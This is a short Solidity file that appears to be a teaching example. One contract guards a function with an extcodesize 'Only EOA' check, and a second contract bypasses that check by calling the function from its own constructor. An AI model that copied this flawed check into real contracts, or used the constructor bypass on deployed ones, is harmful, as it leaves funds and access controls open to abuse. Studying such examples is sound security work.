// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ZeroCodeSizeVulnerable {
    bool public accessed;

    function isContract(address _addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }

    function access() public {
        require(!isContract(msg.sender), "Only EOA");
        accessed = true;
    }
}

contract ZeroCodeSizeAttacker {
    constructor(ZeroCodeSizeVulnerable _victim_) {
        _victim_.access();
    }
}
